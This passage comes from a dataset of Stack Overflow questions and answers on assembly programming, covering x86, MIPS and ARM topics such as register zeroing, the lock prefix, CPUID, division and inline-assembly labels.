    mov ah, 0x01 ; Function 01h Read character from stdin with echo
    int 0x21
    cmp al, 0x0D ; character is carriage return?
    je read_done ; yes? exit the loop
    stosb ; store the character at es:di and increment di
    jmp read_loop ; loop again
read_done:
    mov al, '$'
    stosb ; 'Make sure the string is '$' terminated

    mov dx, string ; ds:dx points to string
    mov ah, 0x09 ; Function 09h Print character string
    int 0x21

    ; Exit
    mov ax, 0x4c00
    int 0x21

string: 
    times 255 db 0 ; reserve room for 255 characters
</code></pre>
","6781107"
"Recursion in MIPS","23794","","<p>I want to implement a recursive program in assembly for MIPS. More specifically, I want to implement the well-known Fibonacci function.</p>

<p>Here's the implementation in C:</p>

<pre><code>int fib(int n) {
    if(n&lt;2)
        return 1;
    return fib(n-1)+fib(n-2);
}
</code></pre>
","<p>Here is the code to do a recursive factorial function in MIPS assembly. Changing it to do Fibonacci is left as an exercise to the reader. (Note: delay slots aren't optimized in this code, as it's designed for readability.)</p>

<pre><code># int fact(int n)
fact:
    subu    sp, sp, 32  # Allocate a 32-byte stack frame
    sw  ra, 20(sp)  # Save Return Address
    sw  fp, 16(sp)  # Save old frame pointer
    addiu   fp, sp, 28  # Setup new frame pointer
    sw  a0,  0(fp)  # Save argument (n) to stack

    lw  v0, 0(fp)   # Load n into v0
    bgtz    v0, L2      # if n &gt; 0 jump to rest of the function
    li  v0, 1       # n==1, return 1
    j   L1      # jump to frame clean-up code

L2:
    lw  v1, 0(fp)   # Load n into v1
    subu    v0, v1, 1   # Compute n-1
    move    a0, v0      # Move n-1 into first argument
    jal fact        # Recursive call

    lw  v1, 0(fp)   # Load n into v1
    mul v0, v0, v1  # Compute fact(n-1) * n

    #Result is in v0, so clean up the stack and return
L1:
    lw  ra, 20(sp)  # Restore return address
    lw  fp, 16(sp)  # Restore frame pointer
    addiu   sp, sp, 32  # Pop stack
    jr  ra      # return
    .end    fact
</code></pre>
","3239788"
"What does the ""lock"" instruction mean in x86 assembly?","23755","","<p>I saw some x86 assembly in Qt's source:</p>

<pre><code>q_atomic_increment:
    movl 4(%esp), %ecx
    lock 
    incl (%ecx)
    mov $0,%eax
    setne %al
    ret

    .align 4,0x90
    .type q_atomic_increment,@function
    .size   q_atomic_increment,.-q_atomic_increment
</code></pre>

<ol>
<li><p>From Googling, I knew <code>lock</code> instruction will cause CPU to lock the bus, but I don't know when CPU frees the bus?</p></li>
<li><p>About the whole above code, I don't understand how this code implements the <code>Add</code>?</p></li>
</ol>
","<ol>
<li><p><code>LOCK</code> is not an instruction itself: it is an instruction prefix, which applies to the following instruction. That instruction must be something that does a read-modify-write on memory (<code>INC</code>, <code>XCHG</code>, <code>CMPXCHG</code> etc.) --- in this case it is the <code>incl (%ecx)</code> instruction which <code>inc</code>rements the <code>l</code>ong word at the address held in the <code>ecx</code> register.</p>

<p>The <code>LOCK</code> prefix ensures that the CPU has exclusive ownership of the appropriate cache line for the duration of the operation, and provides certain additional ordering guarantees. This may be achieved by asserting a bus lock, but the CPU will avoid this where possible. If the bus is locked then it is only for the duration of the locked instruction.</p></li>
<li><p>This code copies the address of the variable to be incremented off the stack into the <code>ecx</code> register, then it does <code>lock incl (%ecx)</code> to atomically increment that variable by 1. The next two instructions set the <code>eax</code> register (which holds the return value from the function) to 0 if the new value of the variable is 0, and 1 otherwise. The operation is an <strong>increment</strong>, not an add (hence the name).</p></li>
</ol>
","8891781"
"Multiplication using Logical shifts in Mips assembly","23637","","<p>Can someone please give me pointers on how i can go about making a code that multiplies using shifts in mips assembly, I don't understand how having a number 2^n can help me multiply using an odd multiplicand </p>

<p>~Thanks</p>

<hr>

<p>I currently have this code, i'm trying to make a calculator</p>

<pre><code>.text

li  $v0, 4 
la  $a0, ask_1
syscall

li  $v0,5
syscall
move    $s1, $v0


li  $v0, 4
la  $a0, ask_2
syscall

li  $v0,5
syscall
move    $s2, $v0

#sll    $s2, $s2, 3     #$s2 * $s2^3 = result
srl $s2, $s2, 1

li  $v0, 1
la  $a0, ($s2)
syscall


.data

ask_1:  .asciiz     ""Enter Multiplier\n""
ask_2:  .asciiz     ""Enter Multiplicand\n""
result: .asciiz         ""The Answer is:\n""
</code></pre>
","<p>Shifting a number n bits left multiples the number by 2<sup>n</sup>. For example <code>n &lt;&lt; 3 = n*2^3 = n*8</code>. The corresponding instruction is</p>

<pre><code>SLL $s1, $s2, 1
</code></pre>

<p>To multiply any number you can split the number into sum of power of 2s. For example:</p>

<blockquote>
  <p>n*10 = n*8 + n*2 = n &lt;&lt; 3 + n &lt;&lt; 1</p>
</blockquote>

<pre><code>SLL $t1, $s2, 1
SLL $t2, $s2, 3
ADD $s2, $t1, $t2
</code></pre>

<p>You can also use a subtraction if it's faster</p>

<blockquote>
  <p>n*15 = n*16 - n = n &lt;&lt; 4 - n</p>
</blockquote>

<pre><code>SLL $t1, $s2, 4
SUB $s1, $t1, $s2
</code></pre>
","18812658"
"What is the best way to set a register to zero in x86 assembly: xor, mov or and?","23625","","<p>All the following instructions do the same thing: set <code>%eax</code> to zero. Which way is optimal (requiring fewest machine cycles)?</p>

<pre><code>xorl   %eax, %eax
mov    $0, %eax
andl   $0, %eax
</code></pre>
","<p><strong>TL;DR summary</strong>: <code>xor same, same</code> is the <strong>best choice for all CPUs</strong>.  No other method has any advantage over it, and it has at least some advantage over any other method.  It's officially recommended by Intel and AMD.  In 64bit mode, still use <code>xor r32, r32</code>, because <a href=""https://stackoverflow.com/questions/11177137/why-do-most-x64-instructions-zero-the-upper-part-of-a-32-bit-register"">writing a 32-bit reg zeros the upper 32</a>.  <code>xor r64, r64</code> is a waste of a byte, because it needs a REX prefix.</p>

<p>Zeroing a vector register is usually best done with <code>pxor xmm, xmm</code>.  That's typically what gcc does (even before use with FP instructions).</p>

<p><code>xorps xmm, xmm</code> can make sense.  It's one byte shorter than <code>pxor</code>, but <code>xorps</code> needs execution port 5 on Intel Nehalem, while <code>pxor</code> can run on any port (0/1/5).  (Nehalem's 2c bypass delay latency between integer and FP is usually not relevant, because out-of-order execution can typically hide it at the start of a new dependency chain).</p>

<p>On SnB-family microarchitectures, neither flavour of xor-zeroing even needs an execution port.  On AMD, and pre-Nehalem P6/Core2 Intel, <code>xorps</code> and <code>pxor</code> are handled the same way (as vector-integer instructions).</p>

<p>Using the AVX version of a 128b vector instruction zeros the upper part of the reg as well, so <code>vpxor xmm, xmm, xmm</code> is a good choice for zeroing YMM(AVX1/AVX2) or ZMM(AVX512), or any future vector extension.  <code>vpxor ymm, ymm, ymm</code> doesn't take any extra bytes to encode, though, and runs the same.  The AVX512 ZMM zeroing would require extra bytes (for the EVEX prefix), so XMM or YMM zeroing should be preferred.</p>

<hr>

<p>Some CPUs recognize <code>sub same,same</code> as a zeroing idiom like <code>xor</code>, but <strong>all CPUs that recognize any zeroing idioms recognize <code>xor</code></strong>.  Just use <code>xor</code> so you don't have to worry about which CPU recognizes which zeroing idiom.</p>

<p><code>xor</code> (being a recognized zeroing idiom, unlike <code>mov reg, 0</code>) has some obvious and some subtle advantages (summary list, then I'll expand on those):</p>

<ul>
<li>smaller code-size than <code>mov reg,0</code>.  (All CPUs)</li>
<li>avoids partial-register penalties for later code.  (Intel P6-family and SnB-family).  </li>
<li>doesn't use an execution unit, saving power and freeing up execution resources.  (Intel SnB-family)</li>
<li>smaller uop (no immediate data) leaves room in the uop cache-line for nearby instructions to borrow if needed.  (Intel SnB-family).</li>
<li><a href=""http://blog.stuffedcow.net/2013/05/measuring-rob-capacity/"" rel=""noreferrer"">doesn't use up entries in the physical register file</a>.  (Intel SnB-family (and P4) at least, possibly AMD as well since they use a similar PRF design instead of keeping register state in the ROB like Intel P6-family microarchitectures.)</li>
</ul>

<hr>

<p><strong>Smaller machine-code size</strong> (2 bytes instead of 5) is always an advantage: Higher code density leads to fewer instruction-cache misses, and better instruction fetch and potentially decode bandwidth.</p>

<hr>

<p>The benefit of <strong>not using an execution unit</strong> for xor on Intel SnB-family microarchitectures is minor, but saves power.  It's more likely to matter on SnB or IvB, which only have 3 ALU execution ports.  Haswell and later have 4 execution ports that can handle integer ALU instructions, including <code>mov r32, imm32</code>, so with perfect decision-making by the scheduler (which doesn't happen in practice), HSW could still sustain 4 uops per clock even when they all need execution ports.</p>

<p>See <a href=""https://stackoverflow.com/a/32673696/224132"">my answer on another question about zeroing registers</a> for some more details. </p>

<p><a href=""https://randomascii.wordpress.com/2012/12/29/the-surprising-subtleties-of-zeroing-a-register/"" rel=""noreferrer"">Bruce Dawson's blog post</a> that Michael Petch linked (in a comment on the question) points out that <code>xor</code> is handled at the register-rename stage without needing an execution unit (zero uops in the unfused domain), but missed the fact that it's still one uop in the fused domain.  Modern Intel CPUs can issue &amp; retire 4 fused-domain uops per clock.  That's where the 4 zeros per clock limit comes from.  Increased complexity of the register renaming hardware is only one of the reasons for limiting the width of the design to 4.  (Bruce has written some very excellent blog posts, like his series on <a href=""https://randomascii.wordpress.com/2012/02/25/comparing-floating-point-numbers-2012-edition/"" rel=""noreferrer"">FP math and x87 / SSE / rounding issues</a>, which I do highly recommend).</p>

<hr>

<p><strong>On AMD Bulldozer-family CPUs</strong>, <code>mov immediate</code> runs on the same EX0/EX1 integer execution ports as <code>xor</code>.  <code>mov reg,reg</code> can also run on AGU0/1, but that's only for register copying, not for setting from immediates.  So AFAIK, on AMD the only advantage to <code>xor</code> over <code>mov</code> is the shorter encoding.  It might also save physical register resources, but I haven't seen any tests.</p>

<hr>

<p>Recognized zeroing idioms <strong>avoid partial-register penalties</strong> on Intel CPUs which rename partial registers separately from full registers (P6 &amp; SnB families).  </p>

<p><code>xor</code> will <strong>tag the register as having the upper parts zeroed</strong>, so <code>xor eax, eax</code> / <code>inc al</code> / <code>inc eax</code> avoids the usual partial-register penalty that pre-IvB CPUs have.  Even without <code>xor</code>, IvB only needs a merging uop when the high 8bits (<code>AH</code>) are modified and then the whole register is read, and Haswell even removes that.</p>

<p>From Agner Fog's microarch guide, pg 98 (Pentium M section, referenced by later sections including SnB):</p>

<blockquote>
  <p>The processor recognizes the XOR of a register with itself as setting
  it to zero. A special tag in the register remembers that the high part
  of the register is zero so that EAX = AL. This tag is remembered even
  in a loop:</p>

<pre><code>    ; Example    7.9. Partial register problem avoided in loop
    xor    eax, eax
    mov    ecx, 100
LL:
    mov    al, [esi]
    mov    [edi], eax    ; No extra uop
    inc    esi
    add    edi, 4
    dec    ecx
    jnz    LL
</code></pre>
  
  <p>(from pg82): The processor remembers that the upper 24 bits of EAX are zero as long as
  you don't get an interrupt, misprediction, or other serializing event.</p>
</blockquote>

<p>pg82 of that guide also confirms that <code>mov reg, 0</code> is <em>not</em> recognized as a zeroing idiom, at least on early P6 designs like PIII or PM.  I'd be very surprised if they spent transistors on detecting it on later CPUs.</p>

<hr>

<p><strong><code>xor</code> sets flags</strong>, which means you have to be careful when testing conditions.  Since <strong><code>setcc</code> is unfortunately only available with an 8bit destination</strong>, you usually need to take care to avoid partial-register penalties.</p>

<p>It would have been nice if x86-64 repurposed one of the removed opcodes (like AAM) for a 16/32/64 bit <code>setcc r/m</code>, with the predicate encoded in the source-register 3-bit field of the r/m field (the way some other single-operand instructions use them as opcode bits).  But they didn't do that, and that wouldn't help for x86-32 anyway.</p>

<p>Ideally, you should use <code>xor</code> / set flags / <code>setcc</code> / read full register:</p>

<pre><code>...
call  some_func
xor     ecx,ecx    ; zero *before* the test
test    eax,eax
setnz   cl         ; cl = (some_func() != 0)
add     ebx, ecx   ; no partial-register penalty here
</code></pre>

<p>This has optimal performance on all CPUs (no stalls, merging uops, or false dependencies).</p>

<p><strong>Things are more complicated when you don't want to xor before a flag-setting instruction</strong>.  e.g. you want to branch on one condition and then setcc on another condition from the same flags.  e.g. <code>cmp/jle</code>, <code>sete</code>, and you either don't have a spare register, or you want to keep the <code>xor</code> out of the not-taken code path altogether.</p>

<p>There are no recognized zeroing idioms that don't affect flags, so the best choice depends on the target microarchitecture.  On Core2, inserting a merging uop might cause a 2 or 3 cycle stall.  It appears to be cheaper on SnB, but I didn't spend much time trying to measure.  Using <code>mov reg, 0</code> / <code>setcc</code> would have a significant penalty on older Intel CPUs, and still be somewhat worse on newer Intel.</p>

<p>Using <code>setcc</code> / <code>movzx r32, r8</code> is probably the best alternative for Intel P6 &amp; SnB families, if you can't xor-zero ahead of the flag-setting instruction.  That should be better than repeating the test after an xor-zeroing.  (Don't even consider <code>sahf</code> / <code>lahf</code> or <code>pushf</code> / <code>popf</code>).  IvB can eliminate <code>movzx r32, r8</code> (i.e. handle it with register-renaming with no execution unit or latency, like xor-zeroing).  Haswell and later only eliminate regular <code>mov</code> instructions, so <code>movzx</code> takes an execution unit and has non-zero latency, making test/<code>setcc</code>/<code>movzx</code> worse than <code>xor</code>/test/<code>setcc</code>, but still at least as good as test/<code>mov r,0</code>/<code>setcc</code> (and much better on older CPUs).</p>

<p>Using <code>setcc</code> / <code>movzx</code> with no zeroing first is bad on AMD/P4/Silvermont, because they don't track deps separately for sub-registers.  There would be a false dep on the old value of the register.  Using <code>mov reg, 0</code>/<code>setcc</code> for zeroing / dependency-breaking is probably the best alternative when <code>xor</code>/test/<code>setcc</code> isn't an option.</p>

<p>Of course, if you don't need <code>setcc</code>'s output to be wider than 8 bits, you don't need to zero anything.  However, beware of false dependencies on CPUs other than P6 / SnB if you pick a register that was recently part of a long dependency chain.  (And beware of causing a partial reg stall or extra uop if you call a function that might save/restore the register you're using part of.)</p>

<hr>

<p><strong><code>and</code> with an immediate zero</strong> isn't special-cased as independent of the old value on any CPUs I'm aware of, so it doesn't break dependency chains.  It has no advantages over <code>xor</code>, and many disadvantages.</p>

<p>See <a href=""http://agner.org/optimize/"" rel=""noreferrer"">http://agner.org/optimize/</a> for microarch documentation, including which zeroing idioms are recognized as dependency breaking (e.g. <code>sub same,same</code> is on some but not all CPUs, while <code>xor same,same</code> is recognized on all.)    <code>mov</code> does break the dependency chain on the old value of the register (regardless of the source value, zero or not, because that's how <code>mov</code> works).  <code>xor</code> only breaks dependency chains in the special-case where src and dest are the same register, which is why <code>mov</code> is left out of the list of <em>specially</em> recognized dependency-breakers.  (Also, because it's not recognized as a zeroing idiom, with the other benefits that carries.)</p>

<p>Interestingly, the oldest P6 design (PPro) <em>didn't</em> recognize <code>xor</code>-zeroing as a dependency-breaker, only as a zeroing idiom for the purposes of avoiding partial-register stalls, so in some cases it was worth using <em>both</em>.  (See Agner Fog's Example 6.17. in his microarch pdf.  He claims this also applies to P2, P3, and even (early?) PM, but I'm sceptical of that.   <a href=""https://randomascii.wordpress.com/2012/12/29/the-surprising-subtleties-of-zeroing-a-register/#comment-2482"" rel=""noreferrer"">A comment on the linked blog post</a> says it was only PPro that had this oversight.  It seems really unlikely that multiple generations of the P6 family existed without recognizing xor-zeroing as a dep breaker.)</p>

<hr>

<p>If it really makes your code nicer or saves instructions, then sure, zero with <code>mov</code> to avoid touching the flags, as long as you don't introduce a performance problem other than code size.  Avoiding clobbering flags is the only sensible reason for not using <code>xor</code>, though.</p>
","33668295"
"Differences Between ARM Assembly and x86 Assembly","23568","","<p>I'm now going to learn ARM Assembly, to develop for my Windows Mobile 5 iPAQ, but I have  some questions:</p>

<ul>
<li>What Are The Main Differences Between ARM Assembly and x86 Assembly?

<ul>
<li>Is Any Differences In The Interrupts(New Types)?

<ul>
<li>Which Are They And What Is The Meaning Of They?</li>
</ul></li>
<li>Best Assembler To Compile And Where To Get It?</li>
</ul></li>
<li>Where I Can Find Some Good Resources?</li>
</ul>
","<p>Main differences:</p>

<ul>
<li><p>ARM is a RISC style architecture - instructions have a regular size (32-bit for standard ARM and 16-bits for Thumb mode, though Thumb has some instructions that chew up 2 instruction 'slots')</p></li>
<li><p>up through at least ARM v5 architecture (I'm not sure what v6 does), the interrupt model on ARM is vastly different than on Intel - instead of pushing registers onto the stack, the ARM swaps to a different set of registers which 'shadow' the normal set.  The mode of the processor determines which register file is visible (and not all registers are necessarily shadowed).  it's a pretty complex arrangement.  Newer ARM Architectures (v7 anyway) have an interrupt model that's closer to Intel's where registers are pushed on to the stack when an interrupt occurs. </p></li>
</ul>

<p>Arm instruction have some interesting features that aren't in Intel's:</p>

<ul>
<li>instructions have conditional flags built in - so each instruction can execute as a NOP if the specified condition flags don't match the current status register flag state (this can be used to avoid all those jumps around one or two instructions that you often see in Intel assembly).</li>
<li>the ARM has shifting logic that can be embedded as part of the instruction. So when using a register as a source operand, you can shift it as an intrinsic part of the instruction.  This helps with indexing arrays, sometimes with arithmetic.</li>
</ul>

<p>On the other side, the ARM can't do much with memory directly except load from and store to it. Intel assembly can perform more operations directly on memory.</p>

<p>Note that the ARM architecture version doesn't correspond directly to the actual ARM processor versions - for example, if I remember right the ARM7 is a architecture v5 processor.  Personally, I find this far more confusing than it should be.</p>

<p>The ARM Architecture references are freely downloadable from <a href=""http://www.arm.com"" rel=""nofollow noreferrer"">http://www.arm.com</a>.  I also suggest getting copies of <a href=""http://www.hitex.com/index.php?id=download-insiders-guides&amp;L=1"" rel=""nofollow noreferrer"">Hitex's guides to various ARM microcontrollers</a> for a good starting point.</p>

<p>There have been several Stackoverflow questions regarding pointers to getting started with ARM.  Reviewing them will give you a lot of good places to start:</p>

<ul>
<li><a href=""https://stackoverflow.com/questions/559683/suggested-resources-for-newbie-arm-programmer"">Suggested resources for newbie ARM programmer?</a></li>
<li><a href=""https://stackoverflow.com/questions/270078/resources-for-learning-arm-assembly"">https://stackoverflow.com/questions/270078/resources-for-learning-arm-assembly</a></li>
<li><a href=""https://stackoverflow.com/questions/1219291/how-to-start-off-with-arm-processors"">How to start off with ARM processors?</a></li>
</ul>
","1732441"
"Labels in GCC inline assembly","23560","","<p>In my ongoing experimentation with GCC inline assembly, I've run into a new problem regarding labels and inlined code.</p>

<p>Consider the following simple jump:</p>

<pre><code>__asm__
(
    ""jmp out;""
    ""out:;""
    :
    :
);
</code></pre>

<p>This does nothing except jump to the <code>out</code> label.  As is, this code compiles fine.  But if you place it inside a function, and then compile with optimization flags, the compiler complains: ""Error: symbol 'out' is already defined"".</p>

<p>What seems to be happening is that the compiler is repeating this assembly code every time it inlines the function.  This causes the label <code>out</code> to get duplicated, leading to multiple <code>out</code> labels.</p>

<p>So, how do I work around this?  Is it really not possible to use labels in inline assembly?  This <a href=""http://www.linux-tutorial.info/modules.php?name=Howto&amp;pagename=Assembly-HOWTO/gcc.html"" rel=""noreferrer"">tutorial on GCC inline assembly</a> mentions that:</p>

<blockquote>
  <p>Thus, you can make put your assembly
  into CPP macros, and inline C
  functions, so anyone can use it in as
  any C function/macro. Inline functions
  resemble macros very much, but are
  sometimes cleaner to use. Beware that
  in all those cases, code will be
  duplicated, so only <strong>local labels</strong> (of
  1: style) should be defined in that
  asm code.</p>
</blockquote>

<p>I tried to find more information about these ""local labels"", but can't seem to find anything relating to inline assembly.  It looks like the tutorial is saying that a local label is a number followed by a colon, (like <code>1:</code>), so I tried using a label like that.  Interestingly, the code compiled, but at run time it simply triggered a Segmentation Fault.  Hmm...</p>

<p>So any suggestions, hints, answers...?</p>
","<p>A <em>declaration</em> of a local label is indeed a number followed by a colon.  But a <em>reference</em> to a local label needs a suffix of <code>f</code> or <code>b</code>, depending on whether you want to look forwards or backwards - i.e. <code>1f</code> refers to the next <code>1:</code> label in the forwards direction.</p>

<p>So declaring the label as <code>1:</code> is correct; but to reference it, you need to say <code>jmp 1f</code> (because you are jumping forwards in this case).</p>
","3898451"
"CPUID implementations in C++","23484","","<p>I would like to know if somebody around here has some good examples of a C++ CPUID implementation that can be referenced from any of the managed .net languages.</p>

<p>Also, should this not be the case, should I be aware of certain implementation differences between X86 and X64?</p>

<p>I would like to use CPUID to get info on the machine my software is running on (crashreporting etc...) and I want to keep everything as widely compatible as possible.</p>

<p>Primary reason I ask is because I am a total noob when it comes to writing what will probably be all machine instructions though I have basic knowledge about CPU registers and so on...</p>

<p>Before people start telling me to Google: I found some examples online, but usually they were not meant to allow interaction from managed code and none of the examples were aimed at both X86 and X64. Most examples appeared to be X86 specific.</p>
","<p>Accessing raw CPUID information is actually very easy, here is a C++ class for that which works in Windows, Linux and OSX:</p>

<pre><code>#ifndef CPUID_H
#define CPUID_H

#ifdef _WIN32
#include &lt;limits.h&gt;
#include &lt;intrin.h&gt;
typedef unsigned __int32  uint32_t;

#else
#include &lt;stdint.h&gt;
#endif

class CPUID {
  uint32_t regs[4];

public:
  explicit CPUID(unsigned i) {
#ifdef _WIN32
    __cpuid((int *)regs, (int)i);

#else
    asm volatile
      (""cpuid"" : ""=a"" (regs[0]), ""=b"" (regs[1]), ""=c"" (regs[2]), ""=d"" (regs[3])
       : ""a"" (i), ""c"" (0));
    // ECX is set to zero for CPUID function 4
#endif
  }

  const uint32_t &amp;EAX() const {return regs[0];}
  const uint32_t &amp;EBX() const {return regs[1];}
  const uint32_t &amp;ECX() const {return regs[2];}
  const uint32_t &amp;EDX() const {return regs[3];}
};

#endif // CPUID_H
</code></pre>

<p>To use it just instantiate an instance of the class, load the CPUID instruction you are interested in and examine the registers.  For example:</p>

<pre><code>#include ""CPUID.h""

#include &lt;iostream&gt;
#include &lt;string&gt;

using namespace std;

int main(int argc, char *argv[]) {
  CPUID cpuID(0); // Get CPU vendor

  string vendor;
  vendor += string((const char *)&amp;cpuID.EBX(), 4);
  vendor += string((const char *)&amp;cpuID.EDX(), 4);
  vendor += string((const char *)&amp;cpuID.ECX(), 4);

  cout &lt;&lt; ""CPU vendor = "" &lt;&lt; vendor &lt;&lt; endl;

  return 0;
}
</code></pre>

<p>This Wikipedia page tells you how to use CPUID: <a href=""http://en.wikipedia.org/wiki/CPUID"">http://en.wikipedia.org/wiki/CPUID</a></p>

<p><strong>EDIT:</strong> Added <code>#include &lt;intrin.h&gt;</code> for Windows, per comments.</p>
","4823889"
"Assembly ADC (Add with carry) to C++","23399","","<p>There is an assembly instruction <code>ADC</code>. I've found this means ""Add with carry"". But I don't know what <em>that</em> means. Or how to write this instruction in C++. And I know it isn't the same as <code>ADD</code>. So making a simple summation is not correct.</p>

<p><strong>INFO:</strong><br>
Compiled in Windows. I'm using a 32-bit Windows Installation. My processor is Core 2 Duo from Intel.</p>
","<p>ADC is the same as ADD but adds an extra 1 if processor's carry flag is set.</p>
","4153899"
"Assembly Division","23355","","<p>In my program, a hex number is divided by ten and the remainder is checked.</p>

<p>First division is performed well; however, after the second division, the program goes wrong. I am new to assembly, and I couldn't find where the problem is...</p>

<p>Here is the code segment:</p>

<pre><code>ORG 1000

    MOV AX, 0x04B4 (1204 decimal value )
    MOV BX, 0x000A ( 10 decimal value )
    MOV CX, 0x0000

    DIV BX ( After this part, AX is 120 decimal and DX 4 decimal )

    CMP DX, 0x0000
    JE eq1

    ADD CX, 0x0002
    JMP con1

    eq1:    ADD CX, 0x0001  

    con1:

    DIV BX ( But, after this division AX becomes 6677 ( 26231 decimal and DX remains 4 decimal )
    CMP DX, 0x0000
</code></pre>

<p>Thanks for help!</p>
","<p>The <code>DIV BX</code> instruction divides the <strong>32-bit</strong> value in DX:AX by BX. Since you're not initializing DX, the upper word of the dividend is whatever garbage was left in the DX register from the previous computation, so you're really dividing 0x00040078=262314 by 10. The result is correct: a quotient of 26231 with a remainder of 4.</p>

<p>In the first division is must have been pure luck that DX happened to be 0 initially.</p>
","13028745"
"MIPS - Storing ints In Array From User Input","23051","","<p>I'm trying to store user input into an array, but when I use sw I get an error ""store address not aligned on word bound"". My goal is to read in 10 integers from the array, but after I input the first digit I get an error at the sw command. I don't know what I'm doing wrong I spent a couple hours trying to figure it out. Any help will be greatly appreciated and marked useful.</p>

<pre><code>        .data 

mess: .asciiz "" Enter 10 numbers to be stored in the array. ""
array: .space 40    #10 element integer array
    .globl main
    .text 
main:
    jal read
    b done
read:
    la $t0, 0   #count variable
    b readLoop
    jr $ra

readLoop:
    beq $t0, 40, read   #branch if equal to 40, 10 items
    li $v0, 4       #Print string
    la $a0, mess        #load prompt
    syscall
    li $v0, 5       #read int
    syscall 
    sw $v0, array       #store input in array ERROR HERE
    addi  $t0, $t0, 4   #add by 4 to count
    b readLoop
print:

done:
</code></pre>

<p>This worked for me. I don't know why it doesn't work above</p>

<pre><code>    .data 
list:  .space 16
.globl main
.text

main:

    li $v0, 5
    syscall
    sw $v0, list

    move $a0, $v0
    li $v0, 1
    syscall
</code></pre>
","<p>Try allocating space for your array before you allocate space for your string in the data segment:</p>

<pre><code>  array: .space 40    #10 element integer array
  mess: .asciiz "" Enter 10 numbers to be stored in the array. ""
</code></pre>

<p>if you allocate the string first the array might start at an address that is not divisible by 4 and lead to a word alignment error</p>
","26603352"
"What does the ""rep stos"" x86 assembly instruction sequence do?","23007","","<p>I recently stumbled across the following assembly instruction sequence:</p>

<pre><code>rep stos    dword ptr [edi]
</code></pre>
","<p>For <code>ecx</code> repetitions, stores the contents of <code>eax</code> into where <code>edi</code> points to, incrementing or decrementing <code>edi</code> (depending on the direction flag) by 4 bytes each time. Normally, this is used for a <code>memset</code>-type operation.</p>

<p>Usually, that instruction is simply written <code>rep stosd</code>. Experienced assembly coders know all the details mentioned above just by seeing that. :-)</p>

<hr>

<p>ETA for completeness (thanks PhiS): Each iteration, <code>ecx</code> is decremented by 1, and the loop stops when it reaches zero. For <code>stos</code>, the only thing you will observe is that <code>ecx</code> is cleared at the end. But, for <code>scas</code> or the like, where the <code>repz</code>/<code>repnz</code> prefixes are used, <code>ecx</code> can be greater than zero if the operation stopped before exhausting <code>ecx</code> bytes/words/whatevers.</p>

<p>Before you ask, <code>scas</code> is used for implementing <code>strchr</code>-type operations. :-P</p>
","3818864"
"Assembly - .data, .code, and registers...?","22847","","<p>So this morning I posted a confused question about assembly and I received some great genuine help, which I really appreciate.</p>

<p>And now I'm starting to get into assembly and am beginning to understand how it works.</p>

<p>Things I feel I understand alright include the stack, interrupts, binary/hex, and in general what most of the basic operations do (jmp, push, mov, etc).</p>

<p>Concepts that I'm struggling to understand and would like help with are below - it would be a huge help if you could address any of the following:</p>

<ol>
<li>What exactly is happening in the .data section? Are those variables we're declaring?</li>
<li>If so, can we declare variables later in the code section? If not, why not? If so, how, and why do we use the data section then?</li>
<li>What's a register? How does it compare to a variable? I mean I know it's a location that stores a small piece of information... but that sounds exactly like a variable to me.</li>
<li>How do I make an array? I know this seems kind of random, but I'm curious as to how I'd go about doing something like this.</li>
<li>Is there a list somewhere of common practices for what each register should be used for? I still don't get them completely, but have noticed some people saying, for example, that a certain register should be used to store 'return values' from procedures - is there a comprehensive or at least informative list of such practices?</li>
<li>One of the reasons I'm learning assembly is to better understand what's going on behind my high level code. With that in mind - when I'm programming in c++, I'm often thinking about the stack and the heap. In assembly I know what the stack is - where's the 'heap'?</li>
</ol>

<p>Some info: I'm using masm32 with WinAsm as an IDE, and I'm working on Windows 7. I have a lot of prior experience programming in higher level languages such as c++/java.</p>

<hr>

<p>edit: Thanks for the help everyone, extremely informative as usual! Great stuff! One last thing though - I'm wondering what the difference is between the Stack Pointer, and the Base pointer, or ESP and EBP. Can someone help me out?</p>

<p>edit: I think I get it now... ESP always points to the top of the stack. However, you can point EBP at whatever you want. ESP is automatically handled but you can do whatever you want with EBP. For example:</p>

<pre><code>push 6
push 5
push 4
mov EBP, ESP
push 3
push 2
</code></pre>

<p>In this scenario, EBP now points to the address holding 4, but ESP now points to the address holding 2.</p>

<p>In a real application 6, 5, and 4 could have been function arguments, whereas 3 and 2 could be local variables within that function.</p>
","<p>Let's try to answer in order!</p>

<ol>
<li><p>The data section contains anything that you want to be automatically initialized for you by the system before it calls the entry point of your program.  You're right, normally global variables end up here.  Zero-initialized data is generally not included in the executable file, since there's no reason to - a couple of directives to the program loader are all that's needed to generate that space.  Once your program starts running, the ZI and data regions are generally interchangeable.  <a href=""http://en.wikipedia.org/wiki/Data_segment"" rel=""noreferrer"">Wikipedia</a> has a lot more information.</p></li>
<li><p>Variables don't really exist when assembly programming, at least not in the sense they do when you're writing C code.  All you have is the decisions you've made about how to lay out your memory.  Variables can be on the stack, somewhere in memory, or just live only in registers.</p></li>
<li><p>Registers are the internal data storage of the processor.  You can, in general, only do operations on values in processor registers.  You can load and store their contents to and from memory, which is the basic operation of how your computer works.  Here's a quick example.  This C code:</p>

<pre><code>int a = 5;
int b = 6;
int *d = (int *)0x12345678; // assume 0x12345678 is a valid memory pointer
*d = a + b;
</code></pre>

<p>Might get translated to some (simplified) assembly along the lines of:</p>

<pre><code>load  r1, 5
load  r2, 6
load  r4, 0x1234568
add   r3, r1, r2
store r4, r3
</code></pre>

<p>In this case, you can think of the registers as variables, but in general it's not necessary that any one variable always stay in the same register; depending on how complicated your routine is, it may not even be possible.  You'll need to push some data onto the stack, pop other data off, and so on.  A 'variable' is that logical piece of data, not where it lives in memory or registers, etc.</p></li>
<li><p>An array is just a contiguous block of memory - for a local array, you can just decrement the stack pointer appropriately.  For a global array, you can declare that block in the data section.</p></li>
<li><p>There are a bunch of conventions about registers - check your platform's ABI or calling convention document for details about how to use them correctly.  Your assembler documentation might have information as well.  Check the <a href=""http://en.wikipedia.org/wiki/Application_binary_interface"" rel=""noreferrer"">ABI article on wikipedia</a>.</p></li>
<li><p>Your assembly program can make the same system calls any C program could, so you can just call <code>malloc()</code> to get memory from the heap.</p></li>
</ol>
","2353328"
"How To Create Your Own x86 Operating System for Modern PC Computers","22844","","<p>I'd like to create a new operating system for x86 PC computers. I'd like it to be 64-bit but possibly run as 32-bit as well.</p>

<p>I have these kinds of questions:</p>

<p>What kinds of things do you start working on first? Knowing where to start in writing your own operating system seems to me to be a tricky subject, so I am interested in your input.</p>

<p>Generally how to go about making your own 32-bit/64-bit operating system, or good resources that mention useful information about going about writing your own operating system for x86 computers. I don't care how old sources are as long as they are still relevant and useful to what I am doing.</p>

